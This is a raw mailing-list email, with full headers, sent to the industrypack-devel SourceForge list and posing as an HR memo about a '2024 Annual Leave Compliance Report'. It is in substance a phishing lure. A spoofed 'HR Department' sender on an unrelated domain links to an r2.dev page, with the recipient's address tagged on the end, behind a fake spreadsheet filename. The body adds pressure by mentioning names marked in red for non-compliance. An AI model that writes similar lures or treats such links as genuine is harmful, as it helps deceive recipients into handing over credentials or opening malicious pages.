Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B0A23948FCD
	for <lists+industrypack-devel@lfdr.de>; Tue,  6 Aug 2024 14:58:22 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sbJlc-0005Uo-TL
	for lists+industrypack-devel@lfdr.de;
	Tue, 06 Aug 2024 12:58:20 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <maci@hxiso.com>) id 1sbJlb-0005Ud-UH
 for industrypack-devel@lists.sourceforge.net;
 Tue, 06 Aug 2024 12:58:19 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=V6rb0Vk356sLpQqGl0wOhPMDwH1AYMoaJ75fvmsN20M=; b=c2e4hx0kCER77usXfMCw6Q8BpK
 2xgJI76KoCdKgdnT8uPCoso80pMbMD7sv0oLymjT+88KpjhpEv828SHU1flb2McT0XaAwLJkTb/QJ
 xfGWylEhTf0Yui0hqUftKtH8yjYPFeJdMkX3tLkc1SqgumdYjsW7pcoDaRnLUNr3la4E=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=V6rb0Vk356sLpQqGl0wOhPMDwH1AYMoaJ75fvmsN20M=; b=R
 5RQGvBjS9jGUctfWmcRro8SPSeFrPGX86RsrOwmk1cMANMy/rh8Av+4jTg7V5hsaAfyjcMpW6J0fg
 yPNjzEnWq0ZoHzXA13mjNwaZRF4v8ffyke4SJ8mDmz13ktAReq70GBz5Bq1fdCyRvbz/jq2sBEQd8
 p+RWNxz5hlxNBPaw=;
Received: from light.hxiso.com ([193.25.216.139])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1sbJlb-0001DP-5H for industrypack-devel@lists.sourceforge.net;
 Tue, 06 Aug 2024 12:58:19 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=hxiso.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=maci@hxiso.com; bh=1SDf16X35X28MLAYCJ4CdEE5330=;
 b=b1BqHroEnBUiQLsHPN0ZtwxzfQZpBpXuv+5IwVyUjrgnwniz9+ocA3K5JyDFYyCWT0NmpZR9tUki
 QL+zE2pECtdzl0fj7k/tyrMUXGBpF35XJNeHrduFhxvg5qLjGwSA+wb5WKxoN5/7IjVNXAh33Ymp
 bk0EHfeoD/L7CkVVIpZrQecEMo/9Sd3HTW9NAvax6ct7njEDzPhxpzFImuttREmtpkEwodozyZrP
 HASDBc6iFRRmvx77IrQjvKs5/mohVkPhthy49fblYVLVcoIY0ryVDLGtt8tTvfiiJmUyG1hH2T6H
 jwODLaQXhCuq5JNr9HjuVHUrHQVX/qJUK9jq3A==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=hxiso.com;
 b=T2yhnSplnaA59ll8FN1omYW7E1OIWiyrivVF3+PIGaLl/n+cXOWzSOPEQ+liU6XfSwGUSBYXW4zQ
 7QAdmn88ch7pwoIQfXuU+OtmoUMnpqU3yWgTQPkf0kCNQ3dZqvsHny/jexVgnVvbKM4/1VtXlfhy
 4yBpniGxqsK90dV6sxKZlPouwvYlJ1aukJ9eYFuR/40iDexqtaZdyA234RLV3hRQESeNuuTdyryj
 xZfLQP3PSfB0cAtysAPJsO1zdcYx2P2XBe+KKAb7A+Qz+XTSo8eQi8LcxpukAm6rwtcemaXj9Tv8
 DLeI1Jc2C2gwNx3EdrXyZRJGSTu55PhOwgjghw==;
From: "HR Department"<maci@hxiso.com>
To: industrypack-devel@lists.sourceforge.net
Date: 6 Aug 2024 07:58:11 -0500
Message-ID: <20240806075810.F355F12D292DA60E@hxiso.com>
MIME-Version: 1.0
X-Spam-Score: 5.0 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Dear Colleague The HR Department has released the annual
 Leave
 Compliance Report for 2024. You can access it via the following link: 2024
 Annual Leave and-update.staff-information./company/employees/.xls 
 Content analysis details:   (5.0 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: hxiso.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 RCVD_IN_DNSWL_BLOCKED  RBL: ADMINISTRATOR NOTICE: The query to
 DNSWL was blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [193.25.216.139 listed in list.dnswl.org]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
 0.0 RCVD_IN_MSPIKE_ZBI     No description available.
 0.0 FROM_MISSPACED         From: missing whitespace
X-Headers-End: 1sbJlb-0001DP-5H
Subject: [Industrypack-devel] Annual-Leave-Compliance-Report-2024
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6810778114865611878=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6810778114865611878==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><p>Dear Colleague<br><br>The HR Department has released the annual Le=
ave Compliance Report for 2024. You can access it via the following link:<b=
r><br>
<a href=3D"https://pub-c533ae88b49143c8b8a01b9d63c4f36b.r2.dev/ILoJJA77qtE7=
u1t.html#industrypack-devel@lists.sourceforge.net">2024 Annual Leave and-up=
date.staff-information./company/employees/.xls</a><br><br>Please do note th=
at all names highlighted in red are those who are yet to comply to the Annu=
al Leave Plan for 2024.<br>
Names of employees marked in Green color have met all the requirements for =
the 2024 Annual Leave Plan<br><br>Should you have further questions, kindly=
 reply this email<br><br><br><br>&nbsp; &nbsp; &nbsp;  <br><br>Thanks &amp;=
 Regards,<br><br> Human Resources<br><br>Memo Desk&nbsp; &nbsp; &nbsp; : HR=
 Department<br>Endorsed by&nbsp; &nbsp;  : Director of Human Resources</p><=
/body></html>


--===============6810778114865611878==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6810778114865611878==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6810778114865611878==--
